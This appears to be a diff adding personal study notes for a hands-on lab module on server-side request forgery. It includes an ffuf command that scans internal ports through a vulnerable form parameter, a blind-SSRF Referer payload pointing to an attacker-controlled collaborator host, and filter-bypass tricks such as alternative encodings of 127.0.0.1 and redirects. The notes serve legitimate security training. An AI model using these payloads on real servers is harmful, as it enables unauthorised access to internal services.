@@ -1,0 +1,27 @@
+![[Server_Side_Attacks_Module_Cheat_Sheet.pdf]]
+
+# SSRF
+## Port Discovery
+```shell-session
+alakin2504@htb[/htb]$ ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
+
+<SNIP>
+
+[Status: 200, Size: 45, Words: 7, Lines: 1, Duration: 0ms]
+    * FUZZ: 3306
+[Status: 200, Size: 8285, Words: 2151, Lines: 158, Duration: 338ms]
+    * FUZZ: 80
+```
+
+## URL Fuzzing
+example: 192.168.0.FUZZ
+
+## Blind SSRF in Referer Header
+Just use Referer: https://r80jbhuq4svofeubo41rcv8hq8wzkp8e.oastify.com/
+
+## Blacklisted SSRF WAF
+- Use an alternative IP representation of `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1`.
+- Register your own domain name that resolves to `127.0.0.1`. You can use `spoofed.burpcollaborator.net` for this purpose.
+- Obfuscate blocked strings using URL encoding or case variation.
+- Provide a URL that you control, which redirects to the target URL. Try using different redirect codes, as well as different protocols for the target URL. For example, switching from an `http:` to `https:` URL during the redirect has been shown to bypass some anti-SSRF filters.
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md
